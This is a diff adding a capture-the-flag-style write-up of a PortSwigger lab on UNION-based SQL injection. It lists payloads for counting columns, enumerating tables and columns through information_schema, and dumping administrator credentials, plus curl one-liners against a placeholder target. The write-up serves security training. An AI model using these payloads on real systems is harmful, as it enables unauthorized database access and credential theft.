@@ -1,0 +1,89 @@
+SQL injection attack, listing the database contents on non-Oracle databases — Practitioner
+
+**Status:** Solved
+
+---
+
+## Goal
+
+Exploit a SQL injection vulnerability to list database contents, find the users table, and retrieve administrator credentials to log in.
+
+---
+
+## Steps (simple & complete)
+
+1. **Find the injection point**
+   - Browse to the shopping application
+   - Click on any product category:
+GET /filter?category=Gifts
+- This parameter is vulnerable to SQL injection
+
+2. **Determine the number of columns**
+- Use ORDER BY to find column count:
+Gifts' ORDER BY 1--
+Gifts' ORDER BY 2--
+Gifts' ORDER BY 3--
+- Keep increasing until error appears
+- Let's say it has 2 columns
+
+3. **Find which columns accept strings**
+- Test each column:
+Gifts' UNION SELECT 'abc','def'--
+- Both columns should accept strings
+
+4. **List all tables in the database**
+- Query the information_schema (PostgreSQL/MySQL):
+Gifts' UNION SELECT table_name,NULL FROM information_schema.tables--
+- Look through results for a users table
+- You might see: `users_abcdef` or similar
+
+5. **List columns in the users table**
+- Once you find the table name (e.g., `users_abcdef`):
+Gifts' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users_abcdef'--
+- Look for username and password columns
+- Columns might be: `username_ghijkl` and `password_mnopqr`
+
+6. **Extract user credentials**
+- Dump the username and password columns:
+Gifts' UNION SELECT username_ghijkl,password_mnopqr FROM users_abcdef--
+7. **Execute the full attack**
+
+Step 1 - Find tables:
+```bash
+curl -s "https://TARGET/filter?category=Gifts'+UNION+SELECT+table_name,NULL+FROM+information_schema.tables--"
+Step 2 - Find columns:
+curl -s "https://TARGET/filter?category=Gifts'+UNION+SELECT+column_name,NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--"
+Step 3 - Extract data:
+curl -s "https://TARGET/filter?category=Gifts'+UNION+SELECT+username_ghijkl,password_mnopqr+FROM+users_abcdef--"
+Log in as administrator
+Find the administrator row in the dumped data
+Copy the username and password
+Go to the login page
+Enter the credentials and log in
+Lab solves automatically
+Example
+Vulnerable endpoint: GET /filter?category=Gifts
+List tables:
+Gifts' UNION SELECT table_name,NULL FROM information_schema.tables--
+Found table: users_abcdef
+List columns:
+Gifts' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users_abcdef'--
+Found columns: username_ghijkl, password_mnopqr
+Extract credentials:
+Gifts' UNION SELECT username_ghijkl,password_mnopqr FROM users_abcdef--
+Key concepts
+information_schema.tables:
+Contains metadata about all tables in the database
+table_name column has the actual table names
+Available in PostgreSQL and MySQL
+information_schema.columns:
+Contains metadata about all columns
+column_name has column names
+table_name lets you filter by specific table
+Use WHERE clause to target specific tables
+Why random suffixes?
+PortSwigger adds random strings to table/column names
+Makes it harder to guess, forcing you to enumerate
+Simulates real-world obfuscation techniques
+Why this works
+The information_schema is a standard SQL database that contains metadata about all other databases, tables, and columns. By querying it through SQL injection, we can map out the entire database structure without knowing anything beforehand. Once we know table and column names, extracting the actual data is straightforward. This is why database administrators should restrict access to information_schema in production environments.
